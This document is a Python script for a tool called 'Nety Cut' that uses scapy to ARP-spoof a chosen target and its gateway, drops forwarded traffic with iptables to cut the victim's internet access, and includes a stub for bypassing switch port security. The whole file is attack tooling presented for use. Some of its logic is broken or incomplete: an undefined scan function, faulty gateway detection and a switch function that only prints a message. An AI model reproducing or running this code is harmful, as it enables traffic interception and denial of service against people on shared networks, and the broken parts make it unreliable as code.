import os
import sys
import time
import threading
import netifaces
from scapy.all import *

def arp_spoof(target_ip, gateway_ip, interface):
    # Craft ARP packets with attacker's MAC address
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=get_mac(target_ip))
    arp_request = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=get_mac(gateway_ip))
    
    try:
        while True:
            send(arp_response, verbose=False, iface=interface)
            send(arp_request, verbose=False, iface=interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")

def get_mac(ip):
    # Retrieve MAC address of a given IP
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src

def cut_internet():
    # Drop packets to disrupt internet access
    os.system("iptables -I FORWARD -j DROP")

def restore_internet():
    # Restore internet access by removing iptables rule
    os.system("iptables -D FORWARD -j DROP")

def manipulate_switch_configuration(target_ip):
    # Attempt to manipulate switch configuration to bypass port security
    # Example: Send SNMP requests to change port security settings
    print(f"Attempting to manipulate switch configuration for {target_ip}...")

def get_gateway_and_interface(target_ip):
    # Automatically detect gateway IP and interface
    gateways = netifaces.gateways()
    for interface in gateways:
        if 'default' in gateways[interface]:
            for gateway_info in gateways[interface]['default']:
                if gateway_info == target_ip:
                    return gateway_info, interface
    return None, None

def display_ips_without_internet(ips):
    # Display a list of IP addresses without internet access
    print("IPs without internet access:")
    for ip in ips:
        print(ip)

def nety_cut_interface():
    # User interface for Nety Cut tool
    while True:
        print("""
        ██████╗ ██╗  ██╗███████╗██████╗  █████╗ 
        ██╔══██╗██║  ██║██╔════╝██╔══██╗██╔══██╗
        ██████╔╝███████║█████╗  ██████╔╝███████║
        ██╔══██╗██╔══██║██╔══╝  ██╔══██╗██╔══██║
        ██████╔╝██║  ██║███████╗██║  ██║██║  ██║
        ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
        
        Welcome to Nety Cut - Cut and Restore Internet
        
        1. Cut Internet Access
        2. Restore Internet Access
        3. Scan Nearby IP Addresses
        4. Display IPs Without Internet Access
        5. Manipulate Switch Configuration
        6. Exit
        
        """)

        choice = input("Enter your choice: ")

        if choice == "1":
            cut_internet()
            print("Internet access cut successfully.")
        elif choice == "2":
            restore_internet()
            print("Internet access restored.")
        elif choice == "3":
            network = input("Enter the network to scan (e.g., 192.168.1.0/24): ")
            ips = scan_ips(network)
            print("Nearby IP addresses scanned successfully.")
        elif choice == "4":
            display_ips_without_internet(ips)
        elif choice == "5":
            manipulate_switch_configuration(target_ip)
        elif choice == "6":
            print("Exiting Nety Cut...")
            sys.exit()
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    gateway_ip, interface = get_gateway_and_interface(target_ip)

    if gateway_ip and interface:
        print(f"Gateway IP detected: {gateway_ip}")
        print(f"Interface detected: {interface}")
        arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip, interface))
        arp_thread.start()
        nety_cut_interface()
    else:
        print("Failed to detect gateway IP and interface.")
